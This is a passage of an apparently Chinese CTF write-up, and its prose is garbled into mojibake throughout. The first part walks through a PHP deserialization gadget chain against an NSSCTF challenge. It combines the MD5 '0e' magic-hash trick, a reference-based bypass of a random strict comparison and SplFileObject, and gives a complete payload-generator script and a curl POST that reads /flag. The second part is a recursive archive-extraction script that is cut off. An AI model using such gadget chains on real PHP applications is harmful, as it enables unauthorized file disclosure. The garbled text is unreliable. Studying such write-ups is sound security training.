<p>å…ˆå¡ç±»å‹ä¸ç›¸ç­‰<br>å¿…é¡»éƒ½æ˜¯å­—ç¬¦ä¸²<br>è¿˜å¿…é¡»ä¸å…¨ç­‰ï¼šharukaze !== ysyy<br>å†å¡ MD5 â€œ==â€ æ¯”è¾ƒ<br>å…³é”®æ˜¯ï¼š<br>md5($a) == md5($b)<br>æ³¨æ„æ˜¯ ==ï¼Œä¸æ˜¯ ===ã€‚<br>PHP çš„ == ä¼šå‘ç”Ÿç±»å‹è½¬æ¢ã€‚åªè¦ MD5 ç»“æœé•¿å¾—åƒç§‘å­¦è®¡æ•°æ³•çš„ 0ï¼š<br>â€œ0e123456â€¦â€ ä¼šè¢«å½“æˆæ•°å­— 0<br>â€œ0e999999â€¦â€ ä¹Ÿä¼šè¢«å½“æˆæ•°å­— 0<br>æ‰€ä»¥ 0 == 0 ä¸ºçœŸ<br>è¿™å°±æ˜¯è‘—åçš„ â€œ0e é­”æœ¯å“ˆå¸Œâ€</p>
<p>æˆåŠŸåï¼ŒæŠŠ acc å½“å‡½æ•°è°ƒç”¨ã€‚<br>å¦‚æœ acc æ˜¯å¯¹è±¡ï¼ŒPHP ä¼šå°è¯•è°ƒç”¨å¯¹è±¡ â†’ è§¦å‘å¯¹è±¡çš„ __invoke()</p>
<p>è·³è½¬åˆ°MISCï¼š</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MISC</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cr4p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cr4p-&gt;png = <span class="string">'010'</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>è¿™é‡Œå¯¹ $cr4p å¯¹è±¡åšå±æ€§èµ‹å€¼ï¼š-&gt;png = â€˜010â€™<br>å¦‚æœ $cr4p è¿™ä¸ªå¯¹è±¡é‡Œ æ²¡æœ‰ png è¿™ä¸ªå±æ€§ï¼Œåˆ™ä¼šè§¦å‘è¯¥å¯¹è±¡çš„ __set($name,$value)ã€‚<br>é¢˜ç›®é‡Œæ­£å¥½åªæœ‰ CRYPTO æœ‰ __setã€‚</p>
<p>è·³è½¬åˆ°CRYPTOï¼š</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CRYPTO</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kyarihoshi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rocage</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dance</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dance = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;last === <span class="variable language_">$this</span>-&gt;dance){</span><br><span class="line">            <span class="variable">$kiss</span> = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">kyarihoshi</span>(<span class="variable">$this</span>-&gt;rocage);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"<span class="subst">$kiss</span>&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"æ­å–œï¼&lt;br&gt;"</span>;</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"LAST DANCE!"</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>dance = md5(rand()) + last === dance<br>dance æ˜¯éšæœºç”Ÿæˆçš„<br>last å¿…é¡»ä¸¥æ ¼ç­‰äº dance æ‰èƒ½èµ°åˆ° new â€¦<br>å¦‚æœä½ æ­£å¸¸æ€è·¯ï¼šä½ ä¸å¯èƒ½é¢„çŸ¥ rand()<br>æ‰€ä»¥å‡ºé¢˜äººæ•…æ„é€¼ä½ æƒ³â€œtrickâ€ã€‚</p>
<p>è¿™ä¸ª trick å°±æ˜¯ï¼šå¼•ç”¨ï¼ˆReferenceï¼‰<br>å¦‚æœä½ è®©ï¼š<br>$last å’Œ $dance æ˜¯åŒä¸€ä¸ªå¼•ç”¨ï¼ˆæŒ‡å‘åŒä¸€ä¸ª zvalï¼‰<br>é‚£ä¹ˆå½“ dance è¢«èµ‹æ–°å€¼æ—¶ï¼Œlast ä¹ŸåŒæ­¥å˜æˆåŒä¸€ä¸ªå€¼ï¼Œäºæ˜¯ï¼š<br>last === dance å¿…ç„¶ä¸ºçœŸï¼ˆç”šè‡³æ˜¯åŒä¸€ä¸ªå˜é‡ï¼‰<br>è¿™å°±æ˜¯è¿™é¢˜æœ€å·§çš„ç‚¹ï¼šç”¨å¼•ç”¨ç»•è¿‡éšæœºæ€§ + ä¸¥æ ¼æ¯”è¾ƒã€‚</p>
<p>ä½ å¯ä»¥æ§åˆ¶ï¼š<br>kyarihoshiï¼šç±»åå­—ç¬¦ä¸²<br>rocageï¼šæ„é€ å‚æ•°<br>äºæ˜¯ä½ å¯ä»¥é€‰ä¸€ä¸ª å†…ç½®ç±»ï¼Œè®© echo $kiss è¾“å‡ºä½ æƒ³è¦çš„ä¸œè¥¿ã€‚<br>æœ€å…¸å‹å°±æ˜¯ï¼š<br>SplFileObject($path)ï¼šè¯»æ–‡ä»¶å†…å®¹ï¼ˆå¾ˆå¤šç¯å¢ƒ echo æ—¶èƒ½è¾“å‡ºè¡Œï¼‰<br>æˆ– FilesystemIterator(â€˜glob:///â€¦â€™)ï¼šæšä¸¾æ–‡ä»¶åï¼ˆä½ ä¹‹å‰å°±ç”¨å®ƒçˆ†å‡ºäº† flag è¿™ä¸ªåå­—ï¼‰<br>æ‰€ä»¥å‡ºé¢˜äººçš„æœ€ç»ˆç›®æ ‡æ˜¯ï¼š<br>è®©ä½ ç”¨åŠ¨æ€ new + echo æ‰“å° flag æ–‡ä»¶çš„å†…å®¹ï¼ˆæˆ–é€šè¿‡è¿­ä»£å™¨æšä¸¾å®šä½ flagï¼‰ã€‚</p>
<p>æœ€ç»ˆè§£é¢˜è„šæœ¬ï¼š</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WEB</span> </span>{</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sauy</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$creambread</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$sauy</span></span>) </span>{ <span class="variable language_">$this</span>-&gt;sauy = <span class="variable">$sauy</span>; }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">REVERSE</span> </span>{</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$re1sen</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$harukaze</span> = <span class="string">'QNKCDZO'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ysyy</span> = <span class="string">'s878926199a'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$acc</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PWN</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wings</span> = <span class="string">'SHENG-YI'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c0trick</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;wings === <span class="string">'SHENG-YI'</span>){</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;c0trick-&gt;<span class="title function_ invoke__">MinatoNamikaze</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"NSS WELCOME YOU!!!"</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"No wings,no fly!"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MISC</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cr4p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>{ <span class="variable language_">$this</span>-&gt;cr4p-&gt;png = <span class="string">'010'</span>; }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CRYPTO</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kyarihoshi</span> = <span class="string">'SplFileObject'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rocage</span> = <span class="string">'/flag'</span>;  <span class="comment">// ä½ è‡ªå·±åç»­æ ¹æ®ç¯å¢ƒæ”¹</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dance</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kiss</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="variable">$crypto</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CRYPTO</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * âœ… å…³é”®ä¿®å¤ï¼šå…ˆç»™ dance ä¸€ä¸ªå ä½å€¼ï¼Œå†åšå¼•ç”¨</span></span><br><span class="line"><span class="comment"> * è¿™æ ·åºåˆ—åŒ–é‡Œ last å’Œ dance æ‰ä¼šéƒ½å˜æˆ R:xx å¼•ç”¨ç»“æ„ï¼Œæ›´ç¨³å®š</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$crypto</span>-&gt;dance = <span class="string">'seed'</span>;</span><br><span class="line"><span class="variable">$crypto</span>-&gt;last  =&amp; <span class="variable">$crypto</span>-&gt;dance;</span><br><span class="line"></span><br><span class="line"><span class="variable">$misc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">MISC</span>();</span><br><span class="line"><span class="variable">$misc</span>-&gt;cr4p = <span class="variable">$crypto</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$reverse</span> = <span class="keyword">new</span> <span class="title function_ invoke__">REVERSE</span>();</span><br><span class="line"><span class="variable">$reverse</span>-&gt;acc = <span class="variable">$misc</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pwn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PWN</span>();</span><br><span class="line"><span class="variable">$pwn</span>-&gt;c0trick = <span class="variable">$reverse</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$web</span> = <span class="keyword">new</span> <span class="title function_ invoke__">WEB</span>(<span class="variable">$pwn</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$web</span>));</span><br></pre></td></tr></tbody></table></figure>

<p>è¿è¡Œå¾—å‡ºçš„ç»“æœèµ‹å€¼ç»™NSS</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">curl -s -X POST -d <span class="string">"NSS=O%3A3%3A%22WEB%22%3A2%3A%7Bs%3A9%3A%22%00WEB%00sauy%22%3BO%3A3%3A%22PWN%22%3A2%3A%7Bs%3A5%3A%22wings%22%3Bs%3A8%3A%22SHENG-YI%22%3Bs%3A7%3A%22c0trick%22%3BO%3A7%3A%22REVERSE%22%3A4%3A%7Bs%3A9%3A%22%00%2A%00re1sen%22%3BN%3Bs%3A8%3A%22harukaze%22%3Bs%3A7%3A%22QNKCDZO%22%3Bs%3A4%3A%22ysyy%22%3Bs%3A11%3A%22s878926199a%22%3Bs%3A3%3A%22acc%22%3BO%3A4%3A%22MISC%22%3A1%3A%7Bs%3A4%3A%22cr4p%22%3BO%3A6%3A%22CRYPTO%22%3A5%3A%7Bs%3A10%3A%22kyarihoshi%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A6%3A%22rocage%22%3Bs%3A5%3A%22%2Fflag%22%3Bs%3A4%3A%22last%22%3Bs%3A4%3A%22seed%22%3Bs%3A5%3A%22dance%22%3BR%3A12%3Bs%3A4%3A%22kiss%22%3BN%3B%7D%7D%7D%7Ds%3A10%3A%22creambread%22%3BN%3B%7D"</span> http://node1.anna.nssctf.cn:28727</span><br></pre></td></tr></tbody></table></figure>

<p>ç„¶åå°±ä¼šè¾“å‡ºflagï¼š</p>
<p><img src="https://a1.boltp.com/2026/02/01/697f0cf4e713f.png" alt="å¾—åˆ°flag"></p>
<hr>
<h2 id="â­ï¸-05-SWPUCTF-2025-ç§‹å­£æ–°ç”Ÿèµ›-Are-u-â€œè„šæœ¬å°å­â€ï¼Ÿ"><a href="#â­ï¸-05-SWPUCTF-2025-ç§‹å­£æ–°ç”Ÿèµ›-Are-u-â€œè„šæœ¬å°å­â€ï¼Ÿ" class="headerlink" title="â­ï¸ 05 [SWPUCTF 2025 ç§‹å­£æ–°ç”Ÿèµ›]Are u â€œè„šæœ¬å°å­â€ï¼Ÿ"></a>â­ï¸ 05 [SWPUCTF 2025 ç§‹å­£æ–°ç”Ÿèµ›]Are u â€œè„šæœ¬å°å­â€ï¼Ÿ</h2><p>ğŸš©flagï¼š<code>NSSCTF{WoW_u_a4e_py7h0n_m4ster!}</code></p>
<p>ğŸ’¡hintï¼š<code>misc</code> </p>
<p>ğŸ”§toolï¼š<code>python</code></p>
<p>Macè‡ªå¸¦è½¯ä»¶è‡ªåŠ¨è§£å‹ingï¼ˆbushi<br><img src="https://a1.boltp.com/2026/02/01/697f0de22ffc8.png" alt="Macè‡ªå¸¦è½¯ä»¶è‡ªåŠ¨è§£å‹ingï¼ˆbushi"></p>
<p>ç„¶åè·‘å®Œå°±å¾—åˆ°flagäº†ã€‚</p>
<p>æ­£ç»è„šæœ¬è§£æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">recursive_extract.py</span></span><br><span class="line"><span class="string">é€’å½’è§£å‹åµŒå¥—å‹å‹ç¼©åŒ…ï¼ˆå¤šç§æ ¼å¼ï¼‰ï¼Œå¹¶åœ¨è§£å‹åç»§ç»­æ‰«ææ–°æ–‡ä»¶ç›´åˆ°æ— å¯è§£å‹é¡¹æˆ–è¾¾åˆ°é™åˆ¶ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æ”¯æŒï¼ˆå†…ç½®ï¼‰ï¼š</span></span><br><span class="line"><span class="string">- .zip</span></span><br><span class="line"><span class="string">- .tar, .tar.gz/.tgz, .tar.bz2/.tbz2, .tar.xz/.txz</span></span><br><span class="line"><span class="string">- .gz (å•æ–‡ä»¶ gzip)</span></span><br><span class="line"><span class="string">- .bz2 (å•æ–‡ä»¶ bzip2)</span></span><br><span class="line"><span class="string">- .xz (å•æ–‡ä»¶ xz)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å¯é€‰æ”¯æŒï¼ˆè‡ªåŠ¨æ¢æµ‹ï¼‰ï¼š</span></span><br><span class="line"><span class="string">- .7z  (ä¼˜å…ˆ py7zrï¼Œå…¶æ¬¡ç³»ç»Ÿ 7z/7za)</span></span><br><span class="line"><span class="string">- .rar (ç³»ç»Ÿ unar/7z)</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> bz2</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> lzma</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> Iterable, <span class="type">Optional</span>, <span class="type">Set</span>, <span class="type">Tuple</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ARCHIVE_EXTS = {</span><br><span class="line">    <span class="string">".zip"</span>,</span><br><span class="line">    <span class="string">".tar"</span>, <span class="string">".tgz"</span>, <span class="string">".tar.gz"</span>, <span class="string">".tbz2"</span>, <span class="string">".tar.bz2"</span>, <span class="string">".txz"</span>, <span class="string">".tar.xz"</span>,</span><br><span class="line">    <span class="string">".gz"</span>, <span class="string">".bz2"</span>, <span class="string">".xz"</span>,</span><br><span class="line">    <span class="string">".7z"</span>, <span class="string">".rar"</span>,</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">which</span>(<span class="params">cmd: <span class="built_in">str</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">    <span class="keyword">return</span> shutil.which(cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_archive</span>(<span class="params">path: Path</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    name = path.name.lower()</span><br><span class="line">    <span class="comment"># å¤„ç†åŒåç¼€</span></span><br><span class="line">    <span class="keyword">for</span> ext <span class="keyword">in</span> (<span class="string">".tar.gz"</span>, <span class="string">".tar.bz2"</span>, <span class="string">".tar.xz"</span>):</span><br><span class="line">        <span class="keyword">if</span> name.endswith(ext):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># å•åç¼€</span></span><br><span class="line">    <span class="keyword">return</span> path.suffix.lower() <span class="keyword">in</span> ARCHIVE_EXTS <span class="keyword">or</span> name.endswith((<span class="string">".tgz"</span>, <span class="string">".tbz2"</span>, <span class="string">".txz"</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">norm_ext</span>(<span class="params">path: Path</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    name = path.name.lower()</span><br><span class="line">    <span class="keyword">for</span> ext <span class="keyword">in</span> (<span class="string">".tar.gz"</span>, <span class="string">".tar.bz2"</span>, <span class="string">".tar.xz"</span>):</span><br><span class="line">        <span class="keyword">if</span> name.endswith(ext):</span><br><span class="line">            <span class="keyword">return</span> ext</span><br><span class="line">    <span class="keyword">if</span> name.endswith(<span class="string">".tgz"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">".tar.gz"</span></span><br><span class="line">    <span class="keyword">if</span> name.endswith(<span class="string">".tbz2"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">".tar.bz2"</span></span><br><span class="line">    <span class="keyword">if</span> name.endswith(<span class="string">".txz"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">".tar.xz"</span></span><br><span class="line">    <span class="keyword">return</span> path.suffix.lower()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_join</span>(<span class="params">base: Path, target: Path</span>) -&gt; Path:</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    é˜² ZipSlipï¼šç¡®ä¿ target è§£å‹åˆ° base ä¸‹</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    base_resolved = base.resolve()</span><br><span class="line">    out = (base_resolved / target).resolve()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">str</span>(out).startswith(<span class="built_in">str</span>(base_resolved) + os.sep) <span class="keyword">and</span> out != base_resolved:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f"Blocked path traversal: <span class="subst">{target}</span>"</span>)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Limits</span>:</span><br><span class="line">    max_depth: <span class="built_in">int</span> = <span class="number">20</span></span><br><span class="line">    max_files: <span class="built_in">int</span> = <span class="number">20000</span></span><br><span class="line">    max_bytes: <span class="built_in">int</span> = <span class="number">2_000_000_000</span>  <span class="comment"># 2GB é»˜è®¤ä¸Šé™</span></span><br><span class="line">    overwrite: <span class="built_in">bool</span> = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Stats</span>:</span><br><span class="line">    files_written: <span class="built_in">int</span> = <span class="number">0</span></span><br><span class="line">    bytes_written: <span class="built_in">int</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ExtractError</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ensure_limits</span>(<span class="params">stats: Stats, limits: Limits, add_files: <span class="built_in">int</span> = <span class="number">0</span>, add_bytes: <span class="built_in">int</span> = <span class="number">0</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> stats.files_written + add_files &gt; limits.max_files:</span><br><span class="line">        <span class="keyword">raise</span> ExtractError(<span class="string">f"Exceeded max_files: <span class="subst">{limits.max_files}</span>"</span>)</span><br><span class="line">    <span class="keyword">if</span> stats.bytes_written + add_bytes &gt; limits.max_bytes:</span><br><span class="line">        <span class="keyword">raise</span> ExtractError(<span class="string">f"Exceeded max_bytes: <span class="subst">{limits.max_bytes}</span>"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_bytes_atomic</span>(<span class="params">dst: Path, data: <span class="built_in">bytes</span>, overwrite: <span class="built_in">bool</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> dst.exists() <span class="keyword">and</span> <span class="keyword">not</span> overwrite:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    dst.parent.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    tmp = dst.with_suffix(dst.suffix + <span class="string">".tmp"</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(tmp, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(data)</span><br><span class="line">    os.replace(tmp, dst)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_zip</span>(<span class="params">src: Path, out_dir: Path, stats: Stats, limits: Limits</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(src) <span class="keyword">as</span> zf:</span><br><span class="line">        infos = zf.infolist()</span><br><span class="line">        ensure_limits(stats, limits, add_files=<span class="built_in">len</span>(infos))</span><br><span class="line">        <span class="keyword">for</span> info <span class="keyword">in</span> infos:</span><br><span class="line">            name = info.filename</span><br><span class="line">            <span class="keyword">if</span> name.endswith(<span class="string">"/"</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># Zip å†…éƒ¨è·¯å¾„å¯èƒ½åŒ…å«åæ–œæ </span></span><br><span class="line">            rel = Path(name.replace(<span class="string">"\\"</span>, <span class="string">"/"</span>))</span><br><span class="line">            dst = safe_join(out_dir, rel)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># ä¼°ç®—ä½“ç§¯ï¼ˆZipInfo.file_size ä¸ºè§£å‹åå¤§å°ï¼‰</span></span><br><span class="line">            ensure_limits(stats, limits, add_files=<span class="number">0</span>, add_bytes=info.file_size)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> dst.exists() <span class="keyword">and</span> <span class="keyword">not</span> limits.overwrite:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            dst.parent.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">with</span> zf.<span class="built_in">open</span>(info, <span class="string">"r"</span>) <span class="keyword">as</span> r, <span class="built_in">open</span>(dst, <span class="string">"wb"</span>) <span class="keyword">as</span> w:</span><br><span class="line">                shutil.copyfileobj(r, w)</span><br><span class="line"></span><br><span class="line">            stats.files_written += <span class="number">1</span></span><br><span class="line">            stats.bytes_written += info.file_size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_tar</span>(<span class="params">src: Path, out_dir: Path, stats: Stats, limits: Limits</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># tarfile è‡ªåŠ¨è¯†åˆ« gz/bz2/xz</span></span><br><span class="line">    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(src, mode=<span class="string">"r:*"</span>) <span class="keyword">as</span> tf:</span><br><span class="line">        members = [m <span class="keyword">for</span> m <span class="keyword">in</span> tf.getmembers() <span class="keyword">if</span> m.isfile() <span class="keyword">or</span> m.islnk() <span class="keyword">or</span> m.issym()]</span><br><span class="line">        ensure_limits(stats, limits, add_files=<span class="built_in">len</span>(members))</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> members:</span><br><span class="line">            rel = Path(m.name)</span><br><span class="line">            dst = safe_join(out_dir, rel)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># ä¼°ç®—ä½“ç§¯ï¼šm.sizeï¼ˆå¯¹æ–‡ä»¶æœ‰æ•ˆï¼‰</span></span><br><span class="line">            <span class="keyword">if</span> m.isfile():</span><br><span class="line">                ensure_limits(stats, limits, add_bytes=m.size)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> dst.exists() <span class="keyword">and</span> <span class="keyword">not</span> limits.overwrite:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            dst.parent.mkdir(parents=<span class="literal">True</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># å¯¹ç¬¦å·é“¾æ¥/ç¡¬é“¾æ¥ï¼šä¸ºå®‰å…¨èµ·è§ï¼Œç›´æ¥è·³è¿‡ï¼ˆä¹Ÿå¯æ”¹æˆå¤„ç†ï¼‰</span></span><br><span class="line">            <span class="keyword">if</span> m.issym() <span class="keyword">or</span> m.islnk():</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            f = tf.extractfile(m)</span><br><span class="line">            <span class="keyword">if</span> f <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">with</span> f, <span class="built_in">open</span>(dst, <span class="string">"wb"</span>) <span class="keyword">as</span> w:</span><br><span class="line">                shutil.copyfileobj(f, w)</span><br><span class="line"></span><br><span class="line">            stats.files_written += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> m.isfile():</span><br><span class="line">                stats.bytes_written += m.size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_single_stream</span>(<span class="params"></span></span><br><span class="line"><span class="params">    src: Path, out_dir: Path, stats: Stats, limits: Limits, kind: <span class="built_in">str</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    å¤„ç† .gz/.bz2/.xz è¿™ç§â€œå•æ–‡ä»¶å‹ç¼©â€ï¼ˆä¸æ˜¯ tarï¼‰</span></span><br><span class="line"><span class="string">    çº¦å®šè¾“å‡ºæ–‡ä»¶åï¼šå»æ‰è¯¥åç¼€</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    suffix = src.suffix.lower()</span><br><span class="line">    <span class="comment"># è¾“å‡ºæ–‡ä»¶åï¼šå»æ‰æœ€åä¸€ä¸ªåç¼€</span></span><br><span class="line">    out_name = src.name[: -<span class="built_in">len</span>(suffix)]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> out_name:</span><br><span class="line">        out_name = src.stem <span class="keyword">or</span> (src.name + <span class="string">".out"</span>)</span><br><span class="line">    dst = safe_join(out_dir, Path(out_name))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> dst.exists() <span class="keyword">and</span> <span class="keyword">not</span> limits.overwrite:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 